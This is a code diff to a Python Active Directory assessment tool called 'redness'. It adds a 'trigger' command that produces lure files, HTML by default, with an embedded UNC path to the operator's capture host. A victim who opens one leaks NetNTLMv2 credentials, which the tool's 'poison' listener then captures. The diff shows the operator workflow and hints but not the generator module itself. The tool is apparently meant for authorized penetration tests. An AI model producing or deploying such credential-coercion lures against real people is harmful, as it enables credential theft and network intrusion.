@@ -12,6 +12,7 @@ from __future__ import annotations
 import argparse
 import sys
 
+from . import trigger
 from .findings import Category, Evidence, Finding, Report, Severity
 from .report import docx_report
 
@@ -389,6 +390,39 @@ def cmd_poison(args) -> int:
     return 0
 
 
+_TRIGGER_BANNER = (
+    "\n=====================================================================\n"
+    " REDNESS trigger — forced-authentication UNC link (NetNTLMv2 capture)\n"
+    " The artifact coerces a victim's credentials when opened. Authorized,\n"
+    " in-scope engagements only — assume written authorization exists.\n"
+    "=====================================================================\n"
+)
+
+
+def cmd_trigger(args) -> int:
+    # Generator output goes to stdout so it can be redirected cleanly
+    # (`redness trigger --host X > lure.html`); the banner + operator hints go to stderr.
+    print(_TRIGGER_BANNER, file=sys.stderr)
+
+    content = trigger.generate(args.format, args.host, share=args.share, filename=args.filename)
+    unc = trigger.unc_path(args.host, args.share, args.filename)
+    _ext = trigger.FORMATS[args.format][1]
+
+    if args.out:
+        with open(args.out, "w", encoding="utf-8") as fh:
+            fh.write(content)
+        print(f"[+] Wrote {args.format} trigger -> {args.out}", file=sys.stderr)
+    else:
+        sys.stdout.write(content)
+        print(f"[*] {args.format} trigger written to stdout "
+              f"(suggested filename: lure{_ext})", file=sys.stderr)
+
+    print(f"[*] Embedded UNC path: {unc}", file=sys.stderr)
+    print("[*] Run `redness poison` on the capture host to catch the NetNTLMv2 auth; "
+          "check the victim's SMB signing via `redness scan`.", file=sys.stderr)
+    return 0
+
+
 def main(argv=None) -> int:
     p = argparse.ArgumentParser(prog="redness", description="AD assessment orchestrator + reporter")
     sub = p.add_subparsers(dest="cmd", required=True)
@@ -453,6 +487,16 @@ def main(argv=None) -> int:
     po.add_argument("--port", type=int, default=8765, help="live graph port")
     po.add_argument("--no-open", action="store_true", help="don't auto-open the browser")
     po.set_defaults(func=cmd_poison)
+
+    tr = sub.add_parser("trigger",
+                        help="generate a forced-authentication UNC trigger link (NetNTLMv2 capture; opt-in)")
+    tr.add_argument("--host", required=True, help="our capture host/IP (where the listener runs)")
+    tr.add_argument("--format", choices=sorted(trigger.FORMATS), default="html",
+                    help="artifact format (default: html)")
+    tr.add_argument("--share", default="share", help="UNC share name (default: share)")
+    tr.add_argument("--filename", default="x.jpg", help="UNC file name (cosmetic; default: x.jpg)")
+    tr.add_argument("--out", help="write artifact to this path (default: print to stdout)")
+    tr.set_defaults(func=cmd_trigger)
 
     args = p.parse_args(argv)
     return args.func(args)
